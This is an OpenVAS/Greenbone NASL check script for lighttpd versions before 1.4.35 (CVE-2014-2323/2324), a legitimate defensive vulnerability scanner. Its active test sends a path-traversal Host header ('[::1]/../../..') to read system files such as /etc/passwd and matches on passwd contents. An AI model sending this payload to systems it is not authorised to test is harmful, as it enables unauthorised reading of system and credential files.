# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:lighttpd:lighttpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802072");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2014-2323", "CVE-2014-2324");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-26 23:50:00 +0000 (Fri, 26 Feb 2021)");
  script_tag(name:"creation_date", value:"2014-05-13 12:18:43 +0530 (Tue, 13 May 2014)");
  script_name("Lighttpd < 1.4.35 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("sw_lighttpd_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("lighttpd/http/detected");

  script_xref(name:"URL", value:"https://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt");
  script_xref(name:"URL", value:"https://seclists.org/oss-sec/2014/q1/561");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210122030421/http://www.securityfocus.com/bid/66153");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210122030421/http://www.securityfocus.com/bid/66157");

  script_tag(name:"summary", value:"Lighttpd is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2014-2323: mod_mysql_vhost module is not properly sanitizing user supplied input passed via
  the hostname

  - CVE-2014-2324: mod_evhost and mod_simple_vhost modules are not properly sanitizing user supplied
  input via the hostname");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL commands and remote attackers to read arbitrary files via hostname.");

  script_tag(name:"affected", value:"Lighttpd versions prior to 1.4.35.");

  script_tag(name:"solution", value:"Update to version 1.4.35 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  # nb: Might not be that reliable anymore these days...
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

# nb: Don't use http_get_cache() as the current status might differ from the "cached" one...
req = http_get( item:"/", port:port );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

# nb: Exit if the normal request is a "Bad Request" to avoid FPs
if( ! res || res =~ "^HTTP/1\.[01] 400" )
  exit( 0 );

files = traversal_files( "linux" );

foreach file( keys( files ) ) {

  url = "/" + files[file];
  req = "GET " + url + " HTTP/1.1" + '\r\n' +
        "Host: [::1]/../../../../../../../" + '\r\n\r\n';
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  # nb: Patched response
  if( ! res || res =~ "^HTTP/1\.[01] 400" )
    continue;

  # nb: Vulnerable lighttpd response
  if( res =~ "(root:.*:0:[01]:|^HTTP/1\.[01] 404)" ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
